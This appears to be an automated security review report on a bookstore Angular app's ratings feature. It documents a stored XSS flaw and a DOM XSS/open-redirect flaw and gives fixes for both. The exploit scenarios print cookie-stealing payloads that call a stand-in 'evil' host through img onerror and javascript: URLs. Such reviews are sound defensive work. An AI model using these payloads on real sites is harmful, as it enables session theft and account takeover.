# Claude Security results

This is a review of the changes on branch `feat/BOOK-2-01-02-storefront-ratings` against `origin/master`: 2 commits, 31 changed files, about 3,456 lines, at revision `d5dab21`. It is a changes scan of `/workspace/bookstore` with no scope narrowing, started 2026-10-16 15:12 UTC at high effort. Two findings survived verification, both MEDIUM: a stored cross-site scripting flaw in the ratings list, and a DOM cross-site scripting / open-redirect flaw in the update-rating page's return link.

## Coverage

This scan reviewed the change, not the repository. The 31 changed files were read in two groups. The first group (16 files) holds the shared `CLAUDE.md` and `.claude/memory` notes, `app.module.ts`, the book details and book list components, and the create-rating and rating-details components plus the rating-list template. The second group (15 files, under `web/src/app/ratings`) holds the rating-list component, rating outcomes and texts, the rating service and model, the star-choice component and the update-rating component. All 31 changed files were reviewed (3,456 lines).

Seven researchers were dispatched at research effort `xhigh` (the effort asked for, not measured), and all seven returned. Each group was read once for injection and input handling, once for authentication and authorization, and once for cryptography and secrets. A seventh researcher worked outward from the changed lines across every changed file, for every kind of vulnerability. No group was asked about memory-safety bugs, and neither was the boundary researcher. The workflow decided this from the changed files' extensions before briefing the researchers, because it took the code to be all in managed languages.

A flaw the change takes no part in is outside this review and left to a scan of the codebase. The panel judged no candidate to be real but older than the change. The verification panel took one run, and no candidate was lost or left unverified.

## Findings

### F1 — Stored XSS: buyer-supplied rating comment rendered via innerHTML after bypassSecurityTrustHtml (MEDIUM, confidence high)

**Impact.** Anyone who can post a rating comment gets persistent script execution in the BookStore web app's origin, for everyone who opens the ratings list. From there the script can make every BookStore API call as the victim: delete books, change config through the ingest settings screens, deface the page, and read anything the origin holds.

**Where.** `web/src/app/ratings/rating-list/rating-list.component.ts:26` in `RatingListComponent.commentHtml`. CWE-79.

**Link to the change.** The change rewrote the comment cell at `web/src/app/ratings/rating-list/rating-list.component.html:19`. It now binds `[innerHTML]` to `commentHtml(rating)` instead of using text interpolation. `commentHtml`, added in the same change, wraps the raw comment in `bypassSecurityTrustHtml`, so stored comment markup now renders as live DOM.

**What.** Any buyer sets the rating comment, through the create and update rating forms or directly through the unauthenticated ratings API (`POST`/`PUT /api/v1/ratings`, CORS `*`). It is stored unchanged and comes back from `GET /api/v1/ratings`. `bypassSecurityTrustHtml` marks it trusted before it reaches `[innerHTML]`, which turns off Angular's built-in HTML sanitizer, so nothing between the API and the DOM neutralises markup.

**Exploit scenario.** The attacker sends `PUT /api/v1/ratings/1` with a JSON body whose `comment` is `<img src=x onerror=fetch('//evil/'+document.cookie)>`. A `POST` with any valid email and ISBN works too, as does the Create Rating form. A member of staff opens `/ratings`, which the UI presents as the place comments are read. The image fails to load, the `onerror` handler runs in the web app's origin, and from there it can call any BookStore API as that user.

**Preconditions.**
- The attacker can submit or change a rating comment. The ratings API needs no authentication.
- A victim opens the `/ratings` list view.

**Fix.** Remove the `bypassSecurityTrustHtml` call. Render the comment with `{{ }}` interpolation, or bind the plain string to `[innerHTML]` so Angular's sanitizer runs. If rich formatting is genuinely needed, sanitise with a strict allow-list (for example DOMPurify), and validate or encode the comment on the server as well.

**Verification.** 3/3 lens verifiers confirmed. The researchers reported it HIGH. The panel's confirming voters all rated it MEDIUM, so its severity was lowered to MEDIUM.

### F2 — DOM XSS / open redirect: returnUrl query parameter assigned to window.location.href without scheme check (MEDIUM, confidence high)

**Impact.** A crafted link gives the attacker script execution in the BookStore web app's origin, or an open redirect to an attacker-controlled site. The script can act as the victim and read anything the origin holds.

**Where.** `web/src/app/ratings/update-rating/update-rating.component.ts:71` in `UpdateRatingComponent.goToRatingsList`. CWE-79.

**Link to the change.** The change adds `web/src/app/ratings/update-rating/update-rating.component.ts:69-72`. It reads `returnUrl` from the route's query parameters and, when present, assigns it straight to `window.location.href`, replacing the router navigation to `/ratings`.

**What.** The `returnUrl` query parameter comes from whoever crafts the link. After a successful save it is assigned to `window.location.href`, and nothing restricts it to a same-site path or an `http(s)` URL. A `javascript:` URL therefore runs in the app's origin, and an absolute URL sends the victim off-site. Angular does not sanitise direct DOM assignments. No Content Security Policy is set in `web/src/index.html` or in how the app is served.

**Exploit scenario.** The attacker sends the victim a link such as `https://bookstore/update-rating/1?returnUrl=javascript:fetch('//evil/'+document.cookie)`. The victim picks a star rating and submits. The save succeeds, `goToRatingsList` assigns the `javascript:` URL to `location`, and the script runs in the BookStore web origin. With `returnUrl=https://evil.example`, the same code redirects the victim to a phishing page instead.

**Preconditions.**
- The victim opens an attacker-crafted update-rating link.
- The victim submits the form and the save succeeds.

**Fix.** Accept only same-app relative paths: require a leading `/` that is not followed by `/` or `\`, and navigate with `router.navigateByUrl`. Alternatively, parse with `new URL(returnUrl, location.origin)` and navigate only where `url.origin === location.origin` and the protocol is `http:` or `https:`. Otherwise fall back to `/ratings`.

**Verification.** 3/3 lens verifiers confirmed.

## What was verified

The seven researchers proposed 10 candidates, which deduplicated to 3. A three-lens adversarial panel then voted on each (reachability, impact, defenses): 9 votes in all, in one verification run. F1 and F2 were each confirmed 3/3. The third candidate was refuted 3/3: a newly added line in `web/src/app/ratings/rating.service.ts:67` logs the request body and `document.cookie` to the console. The panel found that the app sets no cookie, session or token for that line to expose. The stamp's `verification.status` is the one `render_report.py` records beside this report. All seven researchers returned. Every finding comes from reading the code: no tests were run and no exploit was fired.
